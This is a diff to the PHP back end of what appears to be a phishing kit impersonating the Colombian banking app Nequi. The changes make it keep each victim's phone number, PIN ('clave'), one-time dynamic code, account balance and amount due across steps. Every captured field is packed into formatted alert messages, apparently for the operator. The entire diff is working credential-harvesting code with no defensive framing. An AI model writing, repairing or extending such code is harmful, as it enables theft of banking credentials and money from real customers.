@@ -109,13 +109,19 @@ try {
             // Obtener datos acumulados
             $accumulatedData = $sessions[$sessionId]['data'];
             
-            // Construir mensaje con datos acumulados
-            $message = "🟣 <b>NEQUI</b>\n\n";
+            // Construir mensaje con TODOS los datos acumulados
+            $message = "🟣 <b>NEQUI - NÚMERO RECIBIDO</b>\n\n";
             $message .= "📊 <b>Datos Acumulados:</b>\n";
             $message .= "━━━━━━━━━━━━━━━━\n\n";
             
             if (!empty($accumulatedData['phoneNumber'])) {
                 $message .= "📱 <b>Número:</b> <code>{$accumulatedData['phoneNumber']}</code>\n";
+            }
+            if (!empty($accumulatedData['saldo'])) {
+                $message .= "💰 <b>Saldo:</b> <code>\${$accumulatedData['saldo']}</code>\n";
+            }
+            if (!empty($accumulatedData['monto'])) {
+                $message .= "💵 <b>Monto a Pagar:</b> <code>\${$accumulatedData['monto']}</code>\n";
             }
             if (!empty($accumulatedData['clave'])) {
                 $message .= "🔐 <b>Clave:</b> <code>{$accumulatedData['clave']}</code>\n";
@@ -145,22 +151,31 @@ try {
                 ];
             }
             
-            // Guardar clave
+            // Guardar clave preservando datos existentes
             $clave = $data['data']['clave'] ?? '';
-            $sessions[$sessionId]['data']['clave'] = $clave;
+            $sessions[$sessionId]['data'] = array_merge(
+                $sessions[$sessionId]['data'],
+                ['clave' => $clave]
+            );
             $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
             
             file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
             
             $accumulatedData = $sessions[$sessionId]['data'];
             
-            // Construir mensaje con datos acumulados
-            $message = "🟣 <b>NEQUI</b>\n\n";
+            // Construir mensaje con TODOS los datos acumulados
+            $message = "🟣 <b>NEQUI - CLAVE RECIBIDA</b>\n\n";
             $message .= "📊 <b>Datos Acumulados:</b>\n";
             $message .= "━━━━━━━━━━━━━━━━\n\n";
             
             if (!empty($accumulatedData['phoneNumber'])) {
                 $message .= "📱 <b>Número:</b> <code>{$accumulatedData['phoneNumber']}</code>\n";
+            }
+            if (!empty($accumulatedData['saldo'])) {
+                $message .= "💰 <b>Saldo:</b> <code>\${$accumulatedData['saldo']}</code>\n";
+            }
+            if (!empty($accumulatedData['monto'])) {
+                $message .= "💵 <b>Monto a Pagar:</b> <code>\${$accumulatedData['monto']}</code>\n";
             }
             if (!empty($accumulatedData['clave'])) {
                 $message .= "🔐 <b>Clave:</b> <code>{$accumulatedData['clave']}</code>\n";
@@ -251,9 +266,12 @@ try {
                 ];
             }
             
-            // Guardar clave dinámica
+            // Guardar clave dinámica preservando datos existentes
             $dinamica = $data['data']['claveDinamica'] ?? '';
-            $sessions[$sessionId]['data']['claveDinamica'] = $dinamica;
+            $sessions[$sessionId]['data'] = array_merge(
+                $sessions[$sessionId]['data'],
+                ['claveDinamica' => $dinamica]
+            );
             $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
             
             file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
@@ -267,6 +285,12 @@ try {
             
             if (!empty($accumulatedData['phoneNumber'])) {
                 $message .= "📱 <b>Número:</b> <code>{$accumulatedData['phoneNumber']}</code>\n";
+            }
+            if (!empty($accumulatedData['saldo'])) {
+                $message .= "💰 <b>Saldo:</b> <code>\${$accumulatedData['saldo']}</code>\n";
+            }
+            if (!empty($accumulatedData['monto'])) {
+                $message .= "💵 <b>Monto a Pagar:</b> <code>\${$accumulatedData['monto']}</code>\n";
             }
             if (!empty($accumulatedData['clave'])) {
                 $message .= "🔐 <b>Clave:</b> <code>{$accumulatedData['clave']}</code>\n";
